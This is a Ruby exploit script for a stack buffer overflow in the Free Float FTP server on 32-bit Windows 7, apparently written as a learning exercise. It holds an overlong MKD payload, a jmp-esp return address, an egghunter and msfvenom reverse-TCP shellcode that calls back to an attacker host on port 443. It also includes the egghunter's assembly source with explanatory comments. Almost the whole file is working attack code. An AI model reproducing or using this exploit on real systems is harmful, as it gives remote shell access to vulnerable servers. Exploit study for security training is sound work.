#!/usr/bin/ruby

require"socket"
ip = "10.0.0.4"
port = 21
pad1 = "a" * 247
eip = [0x76fa4e47].pack("L")			#found jmp esp in user32.dll with ASLR so wont work after reboot :(
pad2 = "c" * (259 - pad1.length - 4)
egghunt = "\xcc" + "\x66\x81\xca\xff\x0f\x42\x52\x31\xc0\xb0\x6d\xcd\x2e\x3c\x05\x5a\x74\xee\xb8\x65\x67\x67\x79\x89\xd7\xaf\x75\xe9\xaf\x75\xe6\xff\xe7"
#msfvenom -p windows/shell_reverse_tcp LPORT=443 LHOST=10.0.0.11 EXITFUNC=thread -f ruby -b '\x00\x0a\x0d'
shell = "\x90" * 32 + "eggyeggy" + "\xcc" +
"\xda\xd4\xd9\x74\x24\xf4\x5b\x29\xc9\xb1\x4f\xb8\xa9\xa2" +
"\xc7\xf4\x31\x43\x19\x83\xeb\xfc\x03\x43\x15\x4b\x57\x3b" +
"\x1c\x02\x98\xc4\xdd\x74\x10\x21\xec\xa6\x46\x21\x5d\x76" +
"\x0c\x67\x6e\xfd\x40\x9c\xe5\x73\x4d\x93\x4e\x39\xab\x9a" +
"\x4f\x8c\x73\x70\x93\x8f\x0f\x8b\xc0\x6f\x31\x44\x15\x6e" +
"\x76\xb9\xd6\x22\x2f\xb5\x45\xd2\x44\x8b\x55\xd3\x8a\x87" +
"\xe6\xab\xaf\x58\x92\x01\xb1\x88\x0b\x1e\xf9\x30\x27\x78" +
"\xda\x41\xe4\x9b\x26\x0b\x81\x6f\xdc\x8a\x43\xbe\x1d\xbd" +
"\xab\x6c\x20\x71\x26\x6d\x64\xb6\xd9\x18\x9e\xc4\x64\x1a" +
"\x65\xb6\xb2\xaf\x78\x10\x30\x17\x59\xa0\x95\xc1\x2a\xae" +
"\x52\x86\x75\xb3\x65\x4b\x0e\xcf\xee\x6a\xc1\x59\xb4\x48" +
"\xc5\x02\x6e\xf1\x5c\xef\xc1\x0e\xbe\x57\xbd\xaa\xb4\x7a" +
"\xaa\xcc\x96\x12\x1f\xe2\x28\xe3\x37\x75\x5a\xd1\x98\x2d" +
"\xf4\x59\x50\xeb\x03\x9d\x4b\x4b\x9b\x60\x74\xab\xb5\xa6" +
"\x20\xfb\xad\x0f\x49\x90\x2d\xaf\x9c\x36\x7e\x1f\x4f\xf6" +
"\x2e\xdf\x3f\x9e\x24\xd0\x60\xbe\x46\x3a\x17\xf9\xd1\xcf" +
"\x28\x05\x29\xb8\x2a\x05\x2c\x83\xa2\xe3\x44\xe3\xe2\xbc" +
"\xf0\x9a\xae\x36\x60\x62\x65\xde\x01\xf1\xe2\x1e\x4f\xea" +
"\xbc\x49\x18\xdc\xb4\x1f\xb4\x47\x6f\x3d\x45\x11\x48\x85" +
"\x92\xe2\x57\x04\x56\x5e\x7c\x16\xae\x5f\x38\x42\x7e\x36" +
"\x96\x3c\x38\xe0\x58\x96\x92\x5f\x33\x7e\x62\xac\x84\xf8" +
"\x6b\xf9\x72\xe4\xda\x54\xc3\x1b\xd2\x30\xc3\x64\x0e\xa1" +
"\x2c\xbf\x8a\xc1\xce\x15\xe7\x69\x57\xfc\x4a\xf4\x68\x2b" +
"\x88\x01\xeb\xd9\x71\xf6\xf3\xa8\x74\xb2\xb3\x41\x05\xab" +
"\x51\x65\xba\xcc\x73"

payload = pad1 + eip + pad2 + egghunt + shell
TCPSocket.open(ip, port) do |s|
  resp = s.recv(1024)
  puts resp if resp
  s.print"USER anonymous\r"
  resp = s.recv(1024)
  puts resp if resp
  s.print"PASS anonymous\r"
  resp = s.recv(1024)
  puts resp if resp
  s.print"MKD #{payload}\r"
  resp = s.recv(1024)
  puts resp if resp
end
#tested on win7 ultimate SP0 32bit
#egghunter shellcode thanks to corelan and j00ru Windows X86 System Call Table (NT/2000/XP/2003/Vista/2008/7/8/10)
#https://www.corelan.be/index.php/2010/01/09/exploit-writing-tutorial-part-8-win32-egg-hunting/
#http://j00ru.vexillium.org/ntapi/
'''
BITS 32
inc_page:
  or dx,0x0fff   	; get last address in page
inc_edx:
  inc edx        	; acts as a counter
                 	;(increments the value in EDX)
call_ntDisplayString:
  push edx       	; pushes edx value to the  stack
                 	;(saves our current address on the stack)
  xor eax, eax
  mov al, 0x6d   	; 0x2 for NtAccessCheckAndAuditAlarm
                 	; 0x43 for NtDisplayString, 0x6d (win7 http://j00ru.vexillium.org/ntapi/)
                 	; so it can be used as parameter
                 	; to syscall - see next
  int 0x2e       	; tell the kernel i want a do a
                 	; syscall using previous register
  cmp al,0x5     	; check if access violation occurs
                 	;(0xc0000005== ACCESS_VIOLATION) 5
  pop edx        	; restore edx
  je inc_page        	; jmp back to start dx 0x0fffff

  mov eax,"eggy" 	; this is the tag
  mov edi,edx    	; set edi to our pointer
  scasd          	; compare for status
  jnz inc_edx     	; (back to inc edx) check egg found or not

  scasd          	; when egg has been found (compare 4 bytes and increment edi by 4)
  jnz inc_edx      	; (jump back to "inc edx")
                       	; if only the first egg was found
  jmp edi         	; edi points to begin of the shellcode
'''
#assemble with nams and convert to hex string
#nasm egghunter.asm -o egghunter.shell
#ruby -e '[`xxd -p egghunter.shell`.gsub("\n","")].pack("H*").each_byte{|b| print "\\x%02x"%b}'

#summary
#still exploitig the same free float FTP server, so wont explain stack layout
#the ntDisplayString egghunting technique scans the whole process memory for shellcode tags
#ntDisplayString tries to read a memory address, and if get a access villation least significant byte in eax will be 0x05
#so thius is how the egg hunter finds allocated memory 
#once egghunter found the first "eggy", it ll see if the next 4 bytes are "eggy" as well 
#and just jump to address in edi and execute the shellcode
#\xcc are just there for debugging purpose